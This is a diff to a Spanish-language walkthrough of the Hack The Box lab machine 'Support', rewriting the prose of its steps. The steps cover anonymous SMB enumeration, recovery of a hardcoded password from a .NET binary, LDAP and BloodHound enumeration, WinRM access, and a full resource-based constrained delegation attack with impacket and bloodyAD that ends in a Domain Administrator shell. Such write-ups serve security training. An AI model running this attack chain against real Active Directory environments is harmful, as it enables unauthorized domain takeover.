@@ -118,7 +118,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 98.43 seconds
 ```
 
-Veremos varios puertos abiertos entre ellos `kerberos`, `WinRM`, `SMB`, `LDAP`, etc... Pero no vemos aparentemente ningun servidor `web` que suministre una pagina en los puertos normales, pero si identificamos un `dominio` llamado `support.htb` el cual vamos añadir a nuestro archivo `hosts`:
+Observamos múltiples servicios típicos de un **Controlador de Dominio (Active Directory)**:
+
+* Kerberos (`88`)
+* LDAP (`389`, `3268`)
+* SMB (`445`)
+* RPC
+* WinRM (`5985`)
+
+No se detecta un servidor web tradicional en los puertos estándar (`80/443`), pero sí se identifica un dominio:
+
+```
+support.htb
+```
+
+Lo añadimos a nuestro archivo `/etc/hosts` para poder resolverlo correctamente:
 
 ```shell
 nano /etc/hosts
@@ -127,15 +141,15 @@ nano /etc/hosts
 <IP>           support.htb
 ```
 
-Lo guardamos y probamos a listar un poco los recursos compartidos de `SMB` de forma anonima a ver si conseguimos ver algo de info:
+## Enumeración SMB
 
-## SMB
+Dado que el servicio SMB está expuesto, intentamos listar los recursos compartidos de forma anónima:
 
 ```shell
 smbclient -L //support.htb -N
 ```
 
-Info:
+Respuesta:
 
 ```
 Sharename       Type      Comment
@@ -148,20 +162,26 @@ Sharename       Type      Comment
 	SYSVOL          Disk      Logon server share
 ```
 
-Veremos algo interesante y es que vemos un recurso compartido que no viene por defecto llamado `support-tools`, vamos a probar a meternos dentro del mismo de forma anonima:
+#### Observación
+
+Destaca el recurso compartido `support-tools`, ya que no es un recurso por defecto y puede contener información relevante.
+
+### Acceso al recurso compartido
+
+Intentamos acceder al recurso de forma anónima:
 
 ```shell
 smbclient //support.htb/support-tools -N
 ```
 
-Info:
+Respuesta:
 
 ```
 Try "help" to get a list of possible commands.
 smb: \>
 ```
 
-Vemos que funciona, si listamos veremos lo siguiente:
+Listamos su contenido:
 
 ```
   .                                   D        0  Wed Jul 20 13:01:06 2022
@@ -177,7 +197,14 @@ Vemos que funciona, si listamos veremos lo siguiente:
 		4026367 blocks of size 4096. 967978 blocks available
 ```
 
-Vemos varios archivos, la mayoria son `.exe` cosa que en un principio no nos interesan, pero el que si nos vamos a pasar es el archivo `SysinternalsSuite.zip`, vamos analizarlo a ver que contiene.
+La mayoría son herramientas estándar de Windows, pero hay dos archivos especialmente interesantes:
+
+* `SysinternalsSuite.zip`
+* `UserInfo.exe.zip`
+
+### Análisis de archivos
+
+Descargamos el primero:
 
 ```shell
 get SysinternalsSuite.zip
@@ -192,14 +219,16 @@ mv ../SysinternalsSuite.zip .
 unzip SysinternalsSuite.zip
 ```
 
-Veremos muchisimas utilidades de `windows` en `.exe` pero ninguna interesante, vamos a descargarnos el otro que se llama `UserInfo.exe.zip` y descomprimirlo:
+Tras descomprimirlo, observamos múltiples herramientas conocidas de Windows, pero ninguna aporta información relevante en este punto.
+
+Por lo tanto, centramos la atención en el segundo archivo:
 
 ```shell
 get UserInfo.exe.zip
 unzip UserInfo.exe.zip
 ```
 
-Veremos estos archivos:
+Contenido:
 
 ```
 .rw-rw-rw- kali kali  98 KB Tue Mar  1 13:18:50 2022  CommandLineParser.dll
@@ -216,17 +245,17 @@ Veremos estos archivos:
 .rw-rw-rw- kali kali 563 B  Fri May 27 12:59:39 2022  UserInfo.exe.config
 ```
 
-Vamos a probar a ejecutar el binario del `.exe` con una herramienta llamada `mono` que permite ejecutar binarios de `windows` dentro de `linux` utilizando instrucciones traducidas de `Windows` a `Linux` para que nuestro `kernel` lo entienda bien y se pueda ejecutar.
+## Escalada a usuario (LDAP)
 
-## Escalate user ldap
+### Análisis de `UserInfo.exe`
 
-### Analisis de UserInfo.exe
+Para analizar el binario, utilizamos `mono`, que permite ejecutar binarios .NET en sistemas Linux:
 
 ```shell
 mono UserInfo.exe -h
 ```
 
-Info:
+Respuesta:
 
 ```
 Usage: UserInfo.exe [options] [commands]
@@ -239,33 +268,51 @@ Commands:
   user                Get information about a user
 ```
 
-Veremos que esta funcionando, tambien vemos que es una herramienta para buscar usuarios de forma general, si la probamos en nuestro sistema no sacaremos nada de informacion en claro, por lo que vamos analizarla de forma interna con `ghidra`.
+Esto indica que se trata de una herramienta interna para consultar información de usuarios, probablemente mediante LDAP.
+
+Sin embargo, al ejecutarla localmente no obtenemos información útil, por lo que procedemos a analizar el binario de forma estática.
+
+### Ingeniería inversa
+
+Abrimos el binario con `ghidra` para inspeccionar su funcionamiento interno:
 
 ```shell
 ghidra
 ```
 
-Creamos un proyecto, importamos el archivo, lo analizamos y nos vamos al tema de funciones, entre ellas veremos una interesante llamada `getPassword`:
+Tras analizar el binario, identificamos una función interesante llamada:
+
+```
+getPassword
+```
+
+Esto sugiere que el programa podría contener credenciales o lógica sensible embebida.
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260325205407.png" alt=""><figcaption></figcaption></figure>
 
-Vamos a decompilar el archivo con `mono` y exportarlo en un archivo `.il` para poderlo analizar mucho mejor:
+### Decompilación con IL
+
+Dado que es un binario .NET, podemos obtener una representación más clara utilizando `monodis`:
 
 ```shell
 monodis --output=UserInfo.il UserInfo.exe
 ```
 
-Una vez decompilado vamos a filtrar por la funcion y mostrar informacion de la misma a ver que contiene:
+Esto genera un archivo en lenguaje intermedio (IL), que facilita el análisis de funciones internas.
+
+A continuación, filtramos el contenido para localizar la función `getPassword` y analizar su lógica, con el objetivo de identificar posibles credenciales hardcodeadas o mecanismos de autenticación reutilizables.
 
 ### Credenciales Hardcodeadas
 
 <figure><img src="../../.gitbook/assets/vuln1Card_support.png" alt=""><figcaption></figcaption></figure>
 
+Para profundizar en el análisis del binario previamente decompilado (`UserInfo.il`), filtramos directamente la función `getPassword` para identificar posibles credenciales embebidas:
+
 ```shell
 awk '/method.*getPassword/,/^}/' UserInfo.il
 ```
 
-Info:
+Resultado:
 
 ```
 } // end of method Protected::getPassword
@@ -302,14 +349,27 @@ Info:
 }
 ```
 
-De toda esta informacion veremos la `clave` cifrada y la palabra con la que podemos suponer que la puede decodificar parece ser que esta en `XOR`:
+#### Análisis
+
+De este fragmento podemos extraer dos elementos clave:
+
+* **Cadena cifrada (Base64):**
 
 ```
-Clave: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
-Palabra: armando
+0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
 ```
 
-Vamos a ccrear un `script` en `python3` para poder decodificar todo esto.
+* **Clave utilizada:**
+
+```
+armando
+```
+
+Por el patrón observado, es razonable asumir que el valor está protegido mediante un esquema de cifrado basado en **XOR + Base64**.
+
+### Decodificación de la contraseña
+
+Para recuperar la contraseña en texto claro, desarrollamos un script en Python que replica el proceso de descifrado:
 
 > decodeText.py
 
@@ -346,19 +406,23 @@ Ejecutamos el script:
 python3 decodeText.py
 ```
 
-Info:
+Respuesta:
 
 ```
 Contraseña: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-Parece ser que tenemos una contraseña decodificada, pero no sabemos el usuario todavia, vamos a seguir filtrando la informacion del `.il` por cosas que contengan el usuario:
+Hemos obtenido una contraseña válida, pero aún no conocemos el usuario asociado.
+
+### Enumeración del usuario
+
+Para identificar posibles usuarios, filtramos cadenas relevantes dentro del `.il`:
 
 ```shell
 grep -E "ldstr\s+\"[^\"]{3,}\"" UserInfo.il | grep -v "Attribute\|Assembly\|Copyright\|System\|Microsoft"
 ```
 
-Info:
+Respuesta:
 
 ```
 IL_0010:  ldstr "UserInfo.exe"
@@ -410,22 +474,32 @@ Veremos una llamada que es la siguiente:
 IL_0012:  ldstr "support\\ldap"
 ```
 
-Tiene toda la pinta de que el usuario se llama `ldap`, vamos a probar con `netexec`:
+Esto sugiere claramente que el usuario es:
+
+```
+ldap
+```
+
+### Validación de credenciales
+
+Probamos las credenciales obtenidas contra el servicio SMB utilizando `netexec`:
 
 ```shell
 netexec smb support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
 ```
 
-Info:
+Respuesta:
 
 ```
 SMB         10.129.14.53    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.14.53    445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-Veremos que funciona, ya tenemos unas credenciales validas, vamos a dumpearnos el `dominio` entero con dichas credenciales.
+Las credenciales son válidas, lo que nos permite autenticarnos correctamente en el dominio.
 
 ## Escalate user support
+
+Con credenciales válidas, procedemos a realizar una enumeración completa del dominio utilizando **RustHound** (alternativa moderna a BloodHound ingestor):
 
 ```shell
 apt install cargo
@@ -434,7 +508,7 @@ export PATH="$HOME/.cargo/bin:$PATH"
 rusthound --domain support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --zip
 ```
 
-Info:
+Respuesta:
 
 ```
 ---------------------------------------------------
@@ -463,7 +537,9 @@ Powered by g0h4n from OpenCyber
 RustHound Enumeration Completed at 16:13:31 on 03/25/26! Happy Graphing!
 ```
 
-Ahora teniendo este `ZIP` vamos a importarlo en nuestro `BloodHound`.
+Se genera un archivo `.zip` compatible con **BloodHound**, que contiene toda la información necesaria para analizar relaciones, privilegios y posibles vectores de escalada dentro del dominio.
+
+El siguiente paso será importar estos datos en BloodHound para identificar rutas de privilegio hacia usuarios más privilegiados, como `support` o incluso `Domain Admin`.
 
 ### BloodHound
 
@@ -477,7 +553,7 @@ tar -xvzf bloodhound-cli-linux-amd64.tar.gz
 ./bloodhound-cli install
 ```
 
-Info:
+Respuesta:
 
 ```
 ..............................<RESTO DE INFO>......................................
@@ -516,33 +592,45 @@ User: admin
 Pass: bnf8XsztC4Hypx6nMV5eSlhHpuDfEWgH
 ```
 
-Una vez dentro vamos a importar el `.zip` y tendremos que esperar un poco a que cargue todos los datos, despues cuando vayamos al `dashboard` principal veremos todos los datos, vamos a investigar el usuario `ldap` a ver que tiene.
+Al iniciar sesión, la herramienta nos pedirá cambiar la contraseña. Tras esto, ya podremos acceder al panel principal.
+
+A continuación, importamos el archivo `.zip` generado previamente con **RustHound**. Tras unos segundos de procesamiento, tendremos disponibles todos los datos del dominio para su análisis.
+
+#### Análisis inicial
+
+Una vez cargados los datos, comenzamos investigando el usuario `ldap`, pero no encontramos vectores de ataque relevantes asociados a este.
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260325212018.png" alt=""><figcaption></figcaption></figure>
 
-No veremos nada interesante con el usuario `ldap`, pero si investigamos todos los usuarios del dominio veremos uno bastante interesante el usuario `support` por estos permisos:
+Sin embargo, al revisar el resto de usuarios del dominio, identificamos un usuario interesante: `support`, el cual presenta ciertos permisos destacables.
 
 <figure><img src="../../.gitbook/assets/Pasted image 20260325211802.png" alt=""><figcaption></figcaption></figure>
 
-Pero de momento no podremos hacer nada, vamos a enumerar todos los usuarios en un `TXT` mediante `LDAP`:
+Aunque inicialmente no podemos explotarlos directamente, lo marcamos como objetivo potencial.
+
+#### Enumeración de usuarios vía LDAP
+
+Para obtener todos los usuarios del dominio, realizamos una enumeración mediante `LDAP`:
 
 ```shell
 ldapsearch -x -H ldap://support.htb -b "DC=support,DC=htb" -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(objectClass=user)" sAMAccountName | grep "sAMAccountName" | awk '{print $2}' > users.txt
 ```
 
-Ahora vamos a probar a realizar un `kerberoasting` a ver si podemos obtener el `hash` de alguno de ellos, pero no tendremos suerte, si investigamos mas cada usuario veremos que el usuario `support` es el que se puede conectar por `WinRM` por lo que nos va interesando mas ese usuario.
+Con la lista de usuarios generada, intentamos realizar un ataque de **Kerberoasting**, pero no obtenemos resultados válidos.
 
-### Analisis LDAP (support)
+Tras continuar con la enumeración, observamos que el usuario `support` tiene permisos para autenticarse mediante **WinRM**, lo que lo convierte en un objetivo prioritario.
+
+### Análisis LDAP (usuario support)
+
+Procedemos a extraer toda la información del objeto `support` desde LDAP:
 
 <figure><img src="../../.gitbook/assets/vuln2Card_support.png" alt=""><figcaption></figcaption></figure>
-
-Vamos a sacar toda la info del objeto usuario `support` con las credenciales obtenidas:
 
 ```shell
 ldapsearch -x -H ldap://support.htb -b "DC=support,DC=htb" -D "ldap@support.htb" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' "(sAMAccountName=support)"
 ```
 
-Info:
+Respuesta:
 
 ```
 # extended LDIF
@@ -613,28 +701,34 @@ result: 0 Success
 # numReferences: 3
 ```
 
-De toda la informacion que vemos, vemos interesante la parte de `Info` ya que parece ser las credenciales del usuario `support`, vamos a probarlas con `netexec`:
+Este valor tiene alta probabilidad de ser una contraseña almacenada en texto claro o reutilizada.
+
+#### Validación de credenciales
+
+Probamos estas credenciales con `netexec`:
 
 ```shell
 netexec smb support.htb -u support -p 'Ironside47pleasure40Watchful'
 ```
 
-Info:
+Respuesta:
 
 ```
 SMB         10.129.14.165   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False) 
 SMB         10.129.14.165   445    DC               [+] support.htb\support:Ironside47pleasure40Watchful
 ```
 
-### Evil-winrm (support)
+Confirmamos que las credenciales son válidas.
 
-Veremos que ha funcionado, recordemos que nos podemos conectar a `WinRM` con este usuario, por lo que vamos acceder a la maquina de esta forma:
+### Acceso mediante WinRM
+
+Dado que el usuario `support` tiene acceso por WinRM, establecemos una sesión remota:
 
 ```shell
 evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
 ```
 
-Info:
+Respuesta:
 
 ```
 Evil-WinRM shell v3.9
@@ -660,7 +754,9 @@ Veremos que hemos accedido de forma correcta, por lo que leeremos la `flag` del 
 
 <figure><img src="../../.gitbook/assets/vuln3Card_support.png" alt=""><figcaption></figcaption></figure>
 
-Recordemos los privilegios que tenemos con este usuario que vimos anteriormente, podremos hacer lo que queramos en el `DC` mediante el grupo `SHARED SUPPORT ACCOUNTS` y como pertenecemos a el podremos realizar cualquier cosa en el `DC`, para ello vamos a realizar un ataque `RBCD`.
+Recordando el análisis previo en BloodHound, el usuario `support` pertenece al grupo **Shared Support Accounts**, el cual tiene permisos elevados sobre el **Domain Controller (DC)**.
+
+Esto nos permite explotar un escenario de **Resource-Based Constrained Delegation (RBCD)**.
 
 ***
 
@@ -693,13 +789,13 @@ Imagina que:
 
 <figure><img src="../../.gitbook/assets/vuln4Card_support.png" alt=""><figcaption></figcaption></figure>
 
-Para ello primero vamos a crear la maquina desde nuestra maquina atacante con `impacket` con las credenciales de `support`:
+Para comenzar con la explotación, vamos a crear una **cuenta de máquina** desde nuestra máquina atacante utilizando `impacket`, autenticándonos con las credenciales del usuario `support`:
 
 ```shell
 impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' -method SAMR -computer-name ATTACKER$ -computer-pass 'P@ssw0rd!'
 ```
 
-Info:
+Respuesta:
 
 ```
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -707,13 +803,15 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Successfully added machine account ATTACKER$ with password P@ssw0rd!.
 ```
 
-Veremos que se ha creado de forma correcta, ahora usaremos el permiso `GenericAll` que tiene el grupo `Shared Support Accounts` sobre el DC para configurar la delegación y asi que confie en nuestra maquina creada:
+Esto confirma que la cuenta de máquina `ATTACKER$` ha sido creada correctamente en el dominio.
+
+A continuación, aprovechamos el permiso `GenericAll` que posee el grupo **Shared Support Accounts** sobre el **Domain Controller (DC)** para configurar la delegación RBCD, permitiendo que nuestra máquina controlada sea confiable para realizar impersonación:
 
 ```shell
 python3 bloodyAD.py -d support.htb -u support -p 'Ironside47pleasure40Watchful' --host <IP_VICTIM> add rbcd "CN=DC,OU=Domain Controllers,DC=support,DC=htb" "CN=ATTACKER,CN=Computers,DC=support,DC=htb"
 ```
 
-Info:
+Respuesta:
 
 ```
 [!] No security descriptor has been returned, a new one will be created
@@ -721,13 +819,15 @@ Info:
 [+] e.g. badS4U2proxy 'kerberos+pw://support.htb\support:Ironside47pleasure40Watchful@10.129.14.165/?serverip=10.129.14.165' 'HOST/CN=DC,OU=Domain Controllers,DC=support,DC=htb@support.htb' 'Administrator@support.htb'
 ```
 
-Veremos que ha funcionado, ahora `ATTACKER$` puede impersonar usuarios en el DC, vamos a obtener el `TGT` del usuario `Administrator`:
+Con esto, hemos configurado correctamente la delegación basada en recursos, permitiendo que `ATTACKER$` pueda **impersonar usuarios** contra el DC mediante Kerberos.
+
+El siguiente paso consiste en solicitar un ticket Kerberos (TGS) impersonando al usuario `Administrator` mediante el flujo **S4U2Self + S4U2Proxy**:
 
 ```shell
 impacket-getST -spn 'HOST/DC.support.htb' -impersonate Administrator -dc-ip <IP_VICTIM> 'support.htb/ATTACKER$:P@ssw0rd!'
 ```
 
-Info:
+Respuesta:
 
 ```
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -740,14 +840,16 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saving ticket in Administrator@HOST_DC.support.htb@SUPPORT.HTB.ccache
 ```
 
-Veremos que ha funcionado, por lo que vamos a cambiarle el nombre que se nos ha generado para que no sea tan largo y lo exportaremos en la variable de `kerberos` para poder utilizar dicho `TGT` mediante la autenticacion de `kerberos` como el usuario `Administrator`:
+Se ha generado correctamente un ticket Kerberos válido para el usuario `Administrator`.
+
+Para facilitar su uso, renombramos el fichero generado y lo exportamos en la variable de entorno `KRB5CCNAME`, lo que permitirá autenticarnos mediante Kerberos sin necesidad de contraseña:
 
 ```shell
 mv Administrator@HOST_DC.support.htb@SUPPORT.HTB.ccache Administrator.ccache
 export KRB5CCNAME=/<PATH>/Administrator.ccache
 ```
 
-Vamos añadir el `dominio` llamado `dc.support.htb` para que funcione bien y no de problemas:
+Además, añadimos la resolución del hostname del controlador de dominio para evitar problemas de conectividad:
 
 ```shell
 nano /etc/hosts
@@ -756,13 +858,13 @@ nano /etc/hosts
 <IP>           support.htb dc.support.htb
 ```
 
-Lo guardamos y accedemos a la maquina mediante `kerberos` como el usuario `Administrator` por `winrm` con la herramienta de `impacket`:
+Finalmente, utilizamos el ticket Kerberos para autenticarnos como `Administrator` contra el DC mediante `wmiexec` de `impacket`:
 
 ```shell
 impacket-wmiexec -k -no-pass support.htb/Administrator@dc.support.htb
 ```
 
-Info:
+Respuesta:
 
 ```
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
@@ -774,7 +876,9 @@ C:\>whoami
 support\administrator
 ```
 
-Veremos que estamos dentro como dicho usuario, por lo que leeremos la `flag` del `admin`.
+Esto confirma que hemos conseguido acceso como **Administrator**, comprometiendo completamente el Domain Controller.
+
+Por lo que leeremos la `flag` del usuario `admin`.
 
 > root.txt
 
